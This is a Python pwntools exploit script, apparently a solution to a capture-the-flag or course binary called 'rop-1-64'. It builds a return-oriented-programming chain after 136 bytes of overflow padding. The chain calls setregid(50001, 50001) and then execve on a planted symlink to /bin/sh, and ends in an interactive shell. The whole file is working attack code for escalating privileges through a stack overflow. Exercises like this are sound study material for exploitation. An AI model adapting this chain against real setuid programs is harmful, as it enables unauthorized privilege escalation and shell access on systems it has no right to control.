#!/usr/bin/env python

import os
from pwn import *

# want to do:
#   setregid(50001, 50001)
#   execve("/bin/sh", 0, 0)

# here are some syscalls:
"""
0x0000000000400550  __libc_start_main@plt
0x0000000000400560  execve@plt
0x0000000000400570  prctl@plt
0x0000000000400580  setregid@plt
0x00000000004005a0  _start
"""

# here are some ropgadgets:
"""
order: rdi, rsi, rdx, ...
0x00000000004007e3 : pop rdi ; ret
0x00000000004006d8 : pop rdx ; nop ; pop rbp ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
"""

rdi_ret = p64(0x00000000004007e3)
rdx_nop_rbp_ret = p64(0x00000000004006d8)
rsi_r15_ret = p64(0x00000000004007e1)

# addr of pointer for /bin/sh:
"""
0x400537 <printf@plt+7>:        "\001"
"""

# Buffer will look like:
# [...]
# [old-ebp]
# [&setregid]
# [&pop2_ret]
# [50001]
# [50001]
# [&execve]
# [p32(0)]
# [&"/bin/sh"]
# [p32(0)]
# [p32(0)]

# set addresses
setregid_addr = p64(0x0000000000400580)
pop2ret_addr = p64(0x00000000004007e0)
gid = p64(50001)
execve_addr = p64(0x0000000000400560)
zeros = p64(0)

# define address for "/bin/sh"
binsh_addr = p64(0x400537)
if os.path.exists("\x01"):
    os.unlink("\x01")
os.symlink("/bin/sh", "\x01")

# build da buf
buf = "A"*136 + rdi_ret + gid + rsi_r15_ret + gid + zeros + setregid_addr + rdi_ret + binsh_addr + rsi_r15_ret + zeros*2 + rdx_nop_rbp_ret + zeros*2 + execve_addr

# run process and send buffer
p = process("./rop-1-64")
p.sendline(buf)
p.interactive()






